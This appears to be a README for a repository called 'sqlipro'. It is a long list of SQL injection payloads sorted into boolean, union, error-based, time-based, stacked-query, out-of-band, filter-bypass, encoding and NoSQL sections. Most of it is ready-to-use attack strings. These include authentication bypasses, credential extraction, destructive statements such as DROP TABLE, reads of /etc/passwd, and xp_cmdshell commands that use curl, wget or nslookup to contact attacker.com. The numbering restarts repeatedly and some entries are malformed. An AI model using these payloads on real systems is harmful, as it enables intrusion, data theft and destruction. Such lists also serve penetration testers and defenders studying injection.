# sqlipro
ALL KNOW SQLI METHODS

1. Classic Boolean-Based Injection

      
```
1. ' OR '1'='1
2. ' OR '1'='1' -- 
3. ' OR 'a'='a
4. ' AND '1'='1' -- 
5. ' OR (SELECT 1 FROM dual WHERE 1=1) --
6. ' AND '1'='1' /* 
7. ' AND (SELECT COUNT(*) FROM users) > 0 --
8. ' OR EXISTS (SELECT * FROM users) --
9. ' AND 'a'='a' -- 
10. ' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END);
```
    

2. Union-Based Injection

      
```
1. ' UNION SELECT NULL, username, password FROM users --
2. ' UNION ALL SELECT NULL, NULL, NULL --
3. ' UNION SELECT 1, @@version, 3 --
4. ' UNION SELECT username, password FROM users --
5. ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
6. ' UNION SELECT 1, 2, 3 --
7. ' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --
8. ' UNION SELECT COUNT(*), user() FROM users GROUP BY user() --
9. ' UNION SELECT null, id FROM products --
10. ' UNION SELECT 1, database(), version();
```
    

3. Error-Based Injection

      
```
1. ' AND 1=CONVERT(int, (SELECT @@version)) --
2. ' AND 1=CONVERT(int, (SELECT 1/0)) --
3. ' AND (SELECT COUNT(*) FROM users) > 0 -- 
4. ' OR (SELECT @@version) IS NOT NULL -- 
5. ' AND (SELECT COUNT(*) FROM non_existing_table) > 0 --
6. ' AND (SELECT USER()) = 'admin' --
7. ' AND (SELECT SUBSTRING(password, 1, 1) FROM users LIMIT 1) = 'a'; --
8. ' AND 1=CAST((SELECT @@version) AS INT) --
9. ' AND (SELECT CONSTEXT('test')) IS NOT NULL --
10. ' AND 1=CAST((SELECT NULL AS test) AS INT);
```
    

4. Time-Based Injection

      
```
1. ' OR SLEEP(5) -- 
2. ' AND IF(1=1, SLEEP(5), 0) -- 
3. ' AND (SELECT SLEEP(10)) -- 
4. ' AND 1=1 WAITFOR DELAY '00:00:10' --
5. ' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --
6. ' AND (SELECT pg_sleep(5)); --
7. ' AND IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0); --
8. ' OR IF(1=1, SLEEP(5), NULL) -- 
9. ' AND (SELECT COUNT(*) FROM users) > 0 AND SLEEP(10) -- 
10. ' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(10) ELSE NULL END);
```
    

5. Out-of-Band Injection

      
```
1. '; EXEC xp_cmdshell('nslookup example.com') -- 
2. '; SELECT load_file('/etc/passwd'); -- 
3. '; EXECUTE IMMEDIATE 'LOAD_FILE('/path/to/file')'; --
4. '; EXEC xp_cmdshell('ping -c 4 attacker.com') -- 
5. '; SELECT (SELECT COUNT(*) FROM users) INTO OUTFILE '/tmp/output.txt'; -- 
6. '; SELECT SLEEP(5) INTO OUTFILE '/tmp/output.txt'; --
7. '; EXEC xp_cmdshell('curl http://attacker.com') -- 
8. '; SELECT 'test' INTO OUTFILE '/var/www/html/output.txt'; -- 
9. '; EXEC xp_cmdshell('whoami') -- 
10. '; SELECT (SELECT GROUP_CONCAT(username SEPARATOR ':') FROM users) INTO OUTFILE '/tmp/users.txt'; --
```
    

6. Second-Order Injection

      
```
1. '; INSERT INTO users (username, password) VALUES ('admin', 'password') -- 
2. '; INSERT INTO products (name) VALUES ('test' -- 
3. '; UPDATE users SET password='new_password' WHERE username='admin'; --
4. '; DELETE FROM users WHERE username='attacker'; --
5. '); SELECT * FROM users -- 
6. '); UPDATE products SET price=0 WHERE name='product'; --
7. '); INSERT INTO payments (amount) VALUES (1000); --
8. '); DROP TABLE logging; --
9. '); CREATE TABLE test (id INT); --
10. '); SET @a=(SELECT COUNT(*) FROM users); --
```
    

7. Stacked Queries

      
```
1. '; SELECT * FROM users; -- 
2. '; SELECT * FROM products; DROP TABLE test; -- 
3. '; SELECT CURRENT_USER(); SELECT DATABASE(); --
4. '; SELECT 1; SELECT sleep(5); --
5. '; INSERT INTO users (username, password VALUES ('test', 'test'); -- 
6. '; SELECT version(); SHOW DATABASES; --
7. '; UPDATE users SET password='password' WHERE username='admin'; SELECT * FROM users; --
8. '; DELETE FROM users WHERE username='guest'; SELECT * FROM users; --
9. '; EXEC xp_cmdshell('whoami'); SELECT * FROM users; --
10. '; CREATE TABLE test (id INT); SELECT * FROM test; --
```    
8. Bypassing Web Application Firewalls (WAFs)

      
```
1. ' OR 1=1 /* 
2. ' UNION SELECT 1, 2, 3 -- 
3. ' OR 'x'='x' /* 
4. ' OR 'a'='a' -- 
5. ' OR '1'='1' /* 
6. ' OR SLEEP(5) AND '1'='1' -- 
7. ' OR '1'='1' AND '1'='1' /* 
8. ' UNION ALL SELECT NULL, NULL, NULL # 
9. ' UNION SELECT NULL, 'test', 'test' -- 
10. ' AND TRUE ORDER BY 1 -- 
```
    

9. String Concatenation

      
```
1. ' OR (SELECT username FROM users WHERE username = CONCAT('admin', '')) = 'admin' -- 
2. ' OR (SELECT password FROM users WHERE username = CONCAT('admin', '')) = 'password' -- 
3. ' UNION SELECT CONCAT(username, ':', password) FROM users -- 
4. ' AND (SELECT CONCAT('ID: ', id) FROM users) LIKE '%1%' -- 
5. ' AND (SELECT CONCAT(column, ':', val) FROM (SELECT username as column, password as val FROM users) derived) LIKE '%admin%' -- 
6. ' AND (SELECT CONCAT('Length: ', LENGTH(username)) FROM users) = 'Length: 5' -- 
7. ' AND (SELECT CONCAT('Value: ', (SELECT COUNT(*) FROM users))) = 'Value: 1' -- 
8. ' OR (SELECT CONCAT(version())=version()) -- 
9. ' OR (SELECT CONCAT(id, '-', username) FROM users) = '1-admin' -- 
10. ' OR (SELECT CONCAT((SELECT COUNT(*) FROM users), ' Exists')) = '1 Exists' -- 
```
    

10. Comment Injection

```    

1. ' -- 
2. # -- 
3. ' /* comment */ 
4. '/* 
5. ' OR '1'='1' ; # 
6. ' OR '1'='1' -- abc 
7. ' OR '1'='1' /* comment */ 
8. ' UNION SELECT 'a'-- 
9. ' UNION SELECT user(), password FROM users /* 
10. ' UNION SELECT null, username FROM users# 
```
    

1. Piggybacking

      
```
1. ' OR (SELECT COUNT(*) FROM users) > 0; -- 
2. ' OR (SELECT IF(1=1, 1, 0))=1; -- 
3. ' OR (SELECT TOP 1 password FROM users) = 'admin'; -- 
4. ' OR (SELECT MIN(id) FROM users) IS NOT NULL; -- 
5. ' OR (SELECT 1 FROM dual) = 1; -- 
6. ' OR EXISTS(SELECT * FROM users WHERE username='admin'); -- 
7. ' OR (SELECT COUNT(*) FROM orders WHERE status='active') > 0; -- 
8. ' OR (SELECT user() LIMIT 1) IS NOT NULL; -- 
9. ' OR (SELECT @@hostname) = 'localhost'; -- 
10. ' OR (SELECT SLEEP(5)) IS NOT NULL; -- 
```
    

2. Subquery Injection

      
```
1. ' AND (SELECT username FROM users WHERE username='admin') IS NOT NULL; -- 
2. ' AND (SELECT COUNT(*) FROM (SELECT * FROM users) AS subquery) > 0; -- 
3. ' AND (SELECT password FROM users WHERE id=(SELECT MIN(id) FROM users)) = 'password'; -- 
4. ' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'; -- 
5. ' AND (SELECT 1 WHERE EXISTS (SELECT * FROM users))=1; -- 
6. ' AND (SELECT MAX(id) FROM users) >= 1; -- 
7. ' AND (SELECT username FROM users WHERE id=(SELECT TOP 1 id FROM users))='admin'; -- 
8. ' AND (SELECT COUNT(*) FROM (SELECT * FROM orders) AS temp) = 1; -- 
9. ' AND (SELECT @@version) LIKE '%MySQL%'; -- 
10. ' AND (SELECT (SELECT COUNT(*) FROM users) > (SELECT COUNT(*) FROM admins)) = TRUE; -- 
```
    

3. Stacked Queries with Error Handling

      
```
1. '; SELECT * FROM users; -- 
2. '; DROP TABLE non_existing_table; -- 
3. '; SELECT 1; SELECT (SELECT username FROM users) -- 
4. '; SELECT database(); SELECT user(); -- 
5. '; SELECT NULL; SELECT COUNT(*) FROM products; -- 
6. '; CREATE TABLE test (id INT); SELECT * FROM test; -- 
7. '; UPDATE users SET password='new_pass'; -- 
8. '; EXEC xp_cmdshell('dir'); -- 
9. '; DELETE FROM users WHERE username='guest'; SELECT * FROM users; -- 
10. '; SELECT 1; SELECT 2; DROP TABLE test; -- 
```
    

4. Dynamic Input Injection

      
```
1. ' OR (SELECT 'valid' FROM users WHERE username='admin')='valid'; -- 
2. ' OR (SELECT COUNT(*) FROM users WHERE email='test@example.com') > 0; -- 
3. ' OR (SELECT COALESCE((SELECT password FROM users WHERE username='admin'), 'NULL')) IS NOT NULL; -- 
4. ' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) = 1; -- 
5. ' OR (SELECT USER()) = 'user'; -- 
6. ' OR (SELECT 1 FROM users GROUP BY username HAVING COUNT(*) > 0); -- 
7. ' OR (SELECT name FROM products WHERE id=(SELECT MIN(id) FROM products))='product_name'; -- 
8. ' OR (SELECT COUNT(*) FROM (SELECT id FROM users) AS temp) > 0; -- 
9. ' OR (SELECT CONCAT(username, ':', password) FROM users LIMIT 1) IS NOT NULL; -- 
10. ' OR (SELECT LENGTH(password) FROM users WHERE username='admin') > 0; -- 
```
    

5. Database Management System-Specific Payloads

      
```
1. ' UNION SELECT table_name FROM information_schema.tables; -- 
2. ' UNION SELECT user(), password FROM mysql.user; -- 
3. ' OR 1=1; SELECT pg_sleep(5); -- 
4. ' OR EXISTS(SELECT * FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='users'); -- 
5. ' OR (SELECT database()) = 'dbname'; -- 
6. ' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'; -- 
7. ' UNION ALL SELECT NULL, @@version; -- 
8. ' OR (SELECT count(*) FROM sysobjects WHERE xtype='U') > 0; -- 
9. ' AND (SELECT @@version) IS NOT NULL; -- 
10. ' UNION SELECT COUNT(*), GROUP_CONCAT(username) FROM users; -- 
```
    

6. Data-Type Manipulation

      
```
1. ' OR CAST(1 AS CHAR) = '1'; -- 
2. ' OR (SELECT 1 FROM users WHERE username='admin' AND password='password') = 1; -- 
3. ' OR (SELECT LENGTH(password) FROM users) = 8; -- 
4. ' OR (SELECT IF(1=1, 1, 0))=1; -- 
5. ' OR (SELECT ROW_COUNT()) > 0; -- 
6. ' OR (SELECT 1 WHERE 'hello'='hello')=1; -- 
7. ' OR (SELECT CAST(SUBSTRING(username, 1, 1) AS CHAR) FROM users WHERE id=1)='a'; -- 
8. ' OR (SELECT CONVERT(COUNT(*) USING utf8) FROM users) > 0; -- 
9. ' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username='admin') = 97; -- 
10. ' OR (SELECT CONCAT('admin', '') = 'admin'); -- 
```
    

7. Conditional Statements

      
```
1. ' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE NULL END) IS NOT NULL; -- 
2. ' AND (SELECT CASE WHEN (SELECT username FROM users LIMIT 1) = 'admin' THEN 1 ELSE 0 END)=1; -- 
3. ' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 1 THEN 1 ELSE 0 END)=1; -- 
4. ' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT COUNT(*) FROM users) END)=1; -- 
5. ' AND (SELECT CASE WHEN (SELECT MAX(id) FROM users) = 1 THEN 1 ELSE NULL END) IS NOT NULL; -- 
6. ' AND (SELECT CASE WHEN (SELECT LENGTH(username) FROM users) < 10 THEN 'Short' ELSE 'Long' END) = 'Short'; -- 
7. ' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN 1 ELSE 0 END)=1; -- 
8. ' AND (SELECT CASE WHEN (SELECT user()='admin') THEN SLEEP(5) ELSE null END); -- 
9. ' AND (SELECT CASE WHEN (1=1) THEN SLEEP(2) ELSE NULL END); -- 
10. ' AND (SELECT CASE WHEN (SELECT MAX(username) FROM users) IS NOT NULL THEN 1 ELSE NULL END)=1; -- 
```
    

8. Bypassing Filters

      
```
1. ' OR '1'='1' /* 
2. ' OR 1=1; # 
3. ' OR 1=1; -- 
4. ' OR 'x'='x' /* 
5. ' OR (SELECT 'a' FROM users LIMIT 1) = 'a'; -- 
6. ' UNION SELECT 1,a,'test' from users-- 
7. ' AND '1'='1' UNION SELECT 1,2,3; -- 
8. ' UNION ALL SELECT NULL, NULL WHERE '1'='1'; -- 
9. ' OR (1=1); -- 
10. ' AND (SELECT COUNT(*) FROM products) > 0; -- 
```
    

9. Encoding Injection

      
```
1. %27 OR %271%3D%271 -- 
2. %27 OR %271%3D%271# 
3. %3Cscript%3Ealert('XSS')%3C/script%3E -- 
4. %27 UNION SELECT NULL, username FROM users -- 
5. %27 OR (SELECT * FROM products) IS NOT NULL -- 
6. %27 AND (SELECT COUNT(*) FROM users) > 0 -- 
7. %27 OR (SELECT column_name FROM information_schema.columns WHERE table_name='users') -- 
8. %27 SELECT * FROM users -- 
9. %27 AND (SELECT IF(1=1, SLEEP(5), 0)) -- 
10. +OR+1=1 -- 
```
    

10. Advanced Error Messages

      
```
1. ' AND 1=CONVERT(int, (SELECT @@version)) -- 
2. ' AND 1=CONVERT(int, (SELECT 1/0)) -- 
3. ' AND (SELECT COUNT(*) FROM users)=0; -- 
4. ' AND (SELECT (SELECT 1 UNION SELECT NULL)) IS NULL; -- 
5. ' AND (SELECT id FROM users WHERE users.username='admin') IS NOT NULL; -- 
6. ' AND (SELECT VERSION()) = '5.6.40'; -- 
7. ' AND (SELECT @@global.sql_mode) IS NOT NULL; -- 
8. ' AND (SELECT * FROM non_existing_table) IS NULL; -- 
9. ' AND (SELECT COUNT(*) FROM users WHERE username NOT LIKE 'admin') > 0; -- 
10. ' AND (SELECT 1 WHERE (SELECT * FROM information_schema.tables) IS NOT NULL); -- 
```
.
1. Bypassing Authentication

      
```
1. ' OR 1=1; -- 
2. ' OR 'a'='a'; -- 
3. ' OR username='admin' AND password LIKE '%'; -- 
4. ' OR (SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE '%') > 0; -- 
5. ' OR (SELECT CASE WHEN (1=1) THEN '1' ELSE '0' END) = '1'; -- 
6. ' UNION SELECT username, password FROM users WHERE '1'='1'; -- 
7. ' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0; -- 
8. ' UNION SELECT null, null FROM dual WHERE 1=1; -- 
9. ' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='anything'); -- 
10. ' OR (SELECT LENGTH(password) FROM users WHERE username='admin') > 0; -- 
```
    

2. Time-Based Blind Injection (Delays)
```
      

1. ' AND IF(1=1, SLEEP(5), 0) -- 
2. ' AND IF(1=0, SLEEP(5), 0) -- 
3. ' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE NULL END) IS NOT NULL; -- 
4. ' AND (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 0 THEN SLEEP(5) ELSE NULL END) IS NOT NULL; -- 
5. ' AND (SELECT (SELECT COUNT(*) FROM users) FROM DUAL WHERE (SELECT 1) IS NOT NULL) = 1; -- 
6. ' AND (SELECT SLEEP(10)) IS NULL; -- 
7. ' AND 1=(SELECT COUNT(*) FROM orders WHERE id = (SELECT MAX(id) FROM orders)) AND SLEEP(5); -- 
8. ' AND IF((SELECT COUNT(*) FROM users WHERE username='admin') > 0, SLEEP(5), 0); -- 
9. ' AND (SELECT SLEEP(10) FROM users) IS NULL; -- 
10. ' AND 1=IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), 0); -- 
```

3. Character Manipulation
```
1. ' LIKE 'a%' -- 
2. ' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users LIMIT 1) = 97; -- 
3. ' AND (SELECT SUBSTRING(username, 1, 1) FROM users LIMIT 1) = 'a'; -- 
4. ' AND (SELECT LENGTH(password) FROM users WHERE username='admin') = 8; -- 
5. ' AND (SELECT CONCAT(username, ':', password) FROM users WHERE username='admin') LIKE '%'; -- 
6. ' OR (SELECT CHAR_LENGTH(username) FROM users WHERE username='admin') = 5; -- 
7. ' OR (SELECT SUBSTRING(username, 1, 1) FROM users WHERE username='admin') = 'a'; -- 
8. ' OR (SELECT LEFT(password, 1) FROM users WHERE username='admin') = 'p'; -- 
9. ' OR (SELECT RIGHT(username, 1) FROM users WHERE username='admin') = 'n'; -- 
10. ' OR (SELECT CONCAT(SUBSTRING(username, 1, 1), SUBSTRING(password, 1, 1)) FROM users WHERE username='admin') = 'ad'; -- 
```
    

4. Using Alternative Queries

      
```
1. ' UNION SELECT NULL, user() -- 
2. ' UNION SELECT NULL, database() -- 
3. ' UNION SELECT NULL, @@version -- 
4. ' UNION SELECT NULL, COUNT(*) FROM users -- 
5. ' UNION SELECT NULL, NULL from dual WHERE '1'='1' -- 
6. ' UNION SELECT NULL, table_name FROM information_schema.tables -- 
7. ' UNION SELECT NULL, 'test' WHERE '1'='1' -- 
8. ' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users' -- 
9. ' UNION SELECT NULL, NULL, NULL FROM users -- 
10. ' UNION SELECT NULL, IFNULL((SELECT password FROM users WHERE username='admin'), 'none') -- 
```
    

5. Using Mathematical Operations

      
```
1. ' OR (SELECT 1+1) = 2 -- 
2. ' OR (SELECT 5*5) = 25 -- 
3. ' OR (SELECT 10/2) = 5 -- 
4. ' OR (SELECT COUNT(*) FROM users) > 0; -- 
5. ' AND (SELECT (1+2)*3) = 9; -- 
6. ' OR (SELECT ROUND(AVG(id), 0) FROM users) >= 1; -- 
7. ' OR (SELECT MAX(id) FROM users) >= 1; -- 
8. ' OR (SELECT 1) = (SELECT 1); -- 
9. ' OR (SELECT 1 + 1) = 2; -- 
10. ' OR (SELECT 2 * (SELECT COUNT(*) FROM users)) > 0; -- 
```
    

6. Union-Based Error Induction

      
```
1. ' UNION SELECT NULL, 'error' WHERE 1=0; -- 
2. ' UNION SELECT username, password FROM users WHERE 'x'='x'; -- 
3. ' UNION SELECT version(), user(); -- 
4. ' UNION SELECT 1, 'failed' WHERE 2 > 1; -- 
5. ' UNION SELECT COUNT(*), 'error' FROM non_existing_table; -- 
6. ' UNION SELECT NULL, NULL WHERE (SELECT 1 UNION SELECT 1) IS NOT NULL; -- 
7. ' UNION SELECT username, NULL FROM users LIMIT 1; -- 
8. ' UNION SELECT username, password FROM users WHERE (SELECT 0) IS NULL; -- 
9. ' UNION SELECT NULL, NULL FROM dual; -- 
10. ' UNION SELECT NULL, NULL WHERE '1'='1'; -- 
```
    

7. Blind Authentication Bypass

      
```
1. ' OR (SELECT CASE WHEN username='admin' THEN 1 ELSE 0 END) = 1; -- 
2. ' OR (SELECT CASE WHEN (SELECT username FROM users WHERE id=1)='admin' THEN 1 ELSE 0 END) = 1; -- 
3. ' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password') >= 0; -- 
4. ' AND (SELECT user_type FROM users WHERE username='admin')='admin'; -- 
5. ' AND (SELECT id FROM users WHERE username='admin') IS NOT NULL; -- 
6. ' OR (SELECT CHAR_LENGTH(username) FROM users WHERE username='admin') > 0; -- 
7. ' OR (SELECT CONCAT(username, ':', password) FROM users WHERE username='admin') IS NOT NULL; -- 
8. ' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='admin'); -- 
9. ' OR (SELECT 1 WHERE EXISTS(SELECT * FROM users WHERE username='admin' AND password='admin'))=1; -- 
10. ' OR (SELECT CASE WHEN (1=1) THEN 'yes' ELSE 'no' END)='yes'; -- 
```
    

8. Including Comments for Bypass

```   
1. ' /* -- 
2. ' OR 'x'='x' /* 
3. ' OR 1=1; -- 
4. ' UNION SELECT NULL, username /* 
5. ' OR (SELECT COUNT(*) FROM users) > 0; /* 
6. ' OR (SELECT 1=IF(1=1,1,0)) -- 
7. ' AND (SELECT NULL WHERE 1=1); /* 
8. ') /* -- 
9. ' AND (SELECT 1 FROM users WHERE username='admin') = 'admin'; /* 
10. ' UNION SELECT NULL, username FROM users /* 
```
    

9. Structural Injection
```
1. ' OR (SELECT SUM(1) FROM users) > 0; -- 
2. ' UNION SELECT id, username FROM users WHERE length(username) > 0; -- 
3. ' OR (SELECT COUNT(*) FROM (SELECT id FROM users WHERE id > 0) AS t) > 0; -- 
4. ' OR (SELECT 1 WHERE EXISTS(SELECT * FROM users)) IS NOT NULL; -- 
5. ' OR (SELECT MIN(id) FROM users) > 0; -- 
6. ' AND (SELECT COUNT(DISTINCT username) FROM users) > 1; -- 
7. ' OR (SELECT CASE WHEN (SELECT COUNT(*) FROM users) > 1 THEN 1 ELSE 0 END) = 1; -- 
8. ' UNION SELECT NULL, (SELECT MAX(password) FROM users) FROM dual; -- 
9. ' AND (SELECT COUNT(username) FROM (SELECT username FROM users GROUP BY username) AS tmp) > 0; -- 
10. ' OR (SELECT COUNT(DISTINCT username) FROM users) = 1; -- 
```

10. Using Specific Keywords
```
1. ' AND (SELECT table_name FROM information_schema.tables) IS NOT NULL; -- 
2. ' AND (SELECT database() NOT LIKE '') -- 
3. ' UNION SELECT load_file('/etc/passwd') FROM dual; -- 
4. ' UNION SELECT null, null FROM sysobjects; -- 
5. ' AS SELECT 1 FROM users -- 
6. ' SELECT IFNULL((SELECT username FROM users WHERE username='admin'), '') -- 
7. ' UNION ALL SELECT NULL, CASE WHEN 1 THEN 1 ELSE 0 END -- 
8. ' AND (SELECT 1 FROM users WHERE username='admin'); -- 
9. ' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; -- 
10. ' UNION SELECT COUNT(*), NULL FROM users; -- 

```
---

### 1. **Hexadecimal Encoding Exploits**
*Use hexadecimal representations to evade filters that block typical keywords.*

| Payloads |
|---|
| 1. 0x3F; SELECT version(); -- |
| 2. 0x556EION; SELECT user(); -- |
| 3. 0x41646472657373; -- |
| 4. 0x73656C656374; SELECT database(); -- |
| 5. 0x3C7363726970743E; alert('XSS'); -- |
| 6. 0x3C7363726970743E; -- |
| 7. 0x3F; EXEC('cmd'); -- |
| 8. 0x2F2A; SELECT @@version; /* -- |
| 9. 0x3C7363726970743E; -- |
| 10. 0x3F3F; -- |

---

### 2. **Unicode/URL Encoded Bypass**
*Use Unicode or URL encoding for characters to bypass filters.*

| Payloads |
|---|
| 1. %27%20OR%201=1 -- (single quote URL encoded) |
| 2. %uff07%20OR%20%uff07%31=1 -- (full-width quote) |
| 3. %25%27; SELECT version(); -- (percent-encoded quote) |
| 4. %5C%27%20OR%20%5C%27%31=1 -- (escaped backslash) |
| 5. %3C%2Fscript%3E -- (closing script tag) |
| 6. %u0027%20OR%20%u0031=1 -- (Unicode) |
| 7. %e6%97%a5 -- (Japanese character) |
| 8. %0a -- (newline) |
| 9. %0d -- (carriage return) |
| 10. %00 -- (null byte) |

---

### 3. **File Read via Out-of-Band (OOB) using DNS/HTTP**
*Leverage out-of-band channels to exfiltrate data.*

| Payloads |
|---|
| 1. '; EXEC xp_cmdshell('nslookup attacker.com') -- |
| 2. '; SELECT load_file('/etc/passwd') -- |
| 3. '; EXEC xp_cmdshell('curl attacker.com') -- |
| 4. '; SELECT sys_exec('ping attacker.com') -- |
| 5. '; SELECT ('http://attacker.com/?q=' || version()) -- |
| 6. '; EXEC xp_cmdshell('powershell Invoke-WebRequest attacker.com') -- |
| 7. '; SELECT pg_read_file('/etc/passwd') -- |
| 8. '; EXEC xp_cmdshell('curl attacker.com') -- |
| 9. '; SELECT sys_eval('wget attacker.com') -- |
| 10. '; SELECT UTL_HTTP.request('http://attacker.com') -- |

---

### 4. **Boolean-Based Blind with String Lengths**
*Infer data by measuring string lengths.*

| Payloads |
|---|
| 1. ' AND LENGTH((SELECT username FROM users LIMIT 1))=5 -- |
| 2. ' AND LENGTH((SELECT password FROM users WHERE username='admin'))=8 -- |
| 3. ' AND LENGTH((SELECT email FROM users WHERE username='user'))>10 -- |
| 4. ' AND LENGTH((SELECT version()))=8 -- |
| 5. ' AND LENGTH((SELECT database()))=5 -- |
| 6. ' AND LENGTH((SELECT group_concat(username)))>20 -- |
| 7. ' AND LENGTH((SELECT user()))=4 -- |
| 8. ' AND LENGTH((SELECT @@version))=10 -- |
| 9. ' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1))=8 -- |
| 10. ' AND LENGTH((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1))=5 -- |

---

### 5. **Timestamp-based Injection with Fine-Grained Control**
*Use sub-second sleep to determine true/false.*

| Payloads |
|---|
| 1. ' AND (SELECT SLEEP(0.5)) -- |
| 2. ' AND (SELECT pg_sleep(0.2)) -- |
| 3. ' AND (SELECT sys_sleep(0.3)) -- |
| 4. ' AND (SELECT sleep(0.4)) -- |
| 5. ' AND (SELECT waitfor delay '00:00:00.5') -- |
| 6. ' AND (SELECT SLEEP(0.1)) -- |
| 7. ' AND (SELECT pg_sleep(0.7)) -- |
| 8. ' AND (SELECT sys_sleep(0.6)) -- |
| 9. ' AND (SELECT sleep(0.8)) -- |
| 10. ' AND (SELECT SLEEP(0.9)) -- |

---

### 6. **Leveraging Database-Specific Functions for Info Gathering**
*Use functions unique to databases.*

| Payloads |
|---|
| 1. ' OR master.dbo.xp_cmdshell('whoami') -- (MS SQL) |
| 2. ' OR xp_cmdshell('net user') -- (MS SQL) |
| 3. ' OR sys.dm_exec_sql_text(0x[hex]) -- (SQL Server) |
| 4. ' OR pg_current_query() -- (PostgreSQL) |
| 5. ' OR pg_backend_pid() -- |
| 6. ' OR extractvalue(1,concat(0x7e,version(),0x7e)) -- (MySQL) |
| 7. ' OR user() -- (MySQL) |
| 8. ' OR database() -- |
| 9. ' OR @@hostname -- |
| 10. ' OR @@server_name -- |

---

### 7. **Using Conditional Errors for Data Extraction**
*Trigger errors to reveal data.*

| Payloads |
|---|
| 1. ' AND (SELECT 1/0) -- |
| 2. ' AND (SELECT convert(int, (select @@version))) -- |
| 3. ' AND (SELECT count(*) FROM non_existing_table) -- |
| 4. ' AND (SELECT 1 FROM dual WHERE 1=2) -- |
| 5. ' AND (SELECT user() LIKE 'admin') -- |
| 6. ' AND (SELECT substring(password, 1, 1) FROM users LIMIT 1)='a' -- |
| 7. ' AND (SELECT version())='5.7.29' -- |
| 8. ' AND (SELECT count(*) FROM information_schema.tables) > 0 -- |
| 9. ' AND (SELECT 1/NULL) -- |
| 10. ' AND (SELECT 1/0) -- |

---

### 8. **Leveraging SQL Injection in JSON/NoSQL Contexts**
*Use injection payloads targeting JSON queries or NoSQL databases.*

| Payloads |
|---|
| 1. {"$where": "this.username=='admin'"} -- |
| 2. {$gt: ""} || this.password -- |
| 3. {"$regex": "admin"} -- |
| 4. {$ne: null} -- |
| 5. {"$or": [{"username": "admin"}, {"password": "any"}]} -- |
| 6. "$ne": "" -- |
| 7. {"$where": "sleep(5)"} -- |
| 8. {"$where": "function() { sleep(5); }"} -- |
| 9. {"$regex": "^admin"} -- |
| 10. {$where: "this.password.match(/.*/)" } -- |

---

### 9. **Time-based Blind with Multiple Conditions**
*Combine multiple delays to infer complex data.*

| Payloads |
|---|
| 1. ' AND (SELECT SLEEP(0.5)) AND (SELECT SLEEP(0.5)) -- |
| 2. ' AND (SELECT CASE WHEN (1=1) THEN SLEEP(0.3) ELSE 0 END) -- |
| 3. ' AND (SELECT CASE WHEN (username='admin') THEN SLEEP(0.4) ELSE 0 END) -- |
| 4. ' AND (SELECT CASE WHEN (LENGTH(password)>8) THEN SLEEP(0.6) ELSE 0 END) -- |
| 5. ' AND (SELECT CASE WHEN (substring(version(),1,1)='5') THEN SLEEP(0.7) ELSE 0 END) -- |
| 6. ' AND (SELECT CASE WHEN (user()='root') THEN SLEEP(0.8) ELSE 0 END) -- |
| 7. ' AND (SELECT CASE WHEN (database()='mydb') THEN SLEEP(0.9) ELSE 0 END) -- |
| 8. ' AND (SELECT CASE WHEN (length(user())=5) THEN SLEEP(1) ELSE 0 END) -- |
| 9. ' AND (SELECT CASE WHEN (version() LIKE '5%') THEN SLEEP(1.1) ELSE 0 END) -- |
| 10. ' AND (SELECT CASE WHEN (user() like '%admin%') THEN SLEEP(1.2) ELSE 0 END) -- |

---

### 10. **Exploiting Stored Procedures and Functions**
*Inject into stored procedures or user-defined functions.*

| Payloads |
|---|
| 1. '; EXEC master..xp_cmdshell('whoami') -- |
| 2. '; SELECT load_file('/etc/passwd') -- |
| 3. '; EXEC sys.sp_executesql('SELECT version()') -- |
| 4. '; CALL get_user_info() -- |
| 5. '; EXEC xp_cmdshell('ping attacker.com') -- |
| 6. '; SELECT * FROM sysobjects -- |
| 7. '; EXEC sp_helptext 'dangerous_proc' -- |
| 8. '; EXECUTE IMMEDIATE('SELECT version()') -- |
| 9. '; EXEC sys.xp_cmdshell('net user') -- |
| 10. '; EXEC('whoami') -- |

---

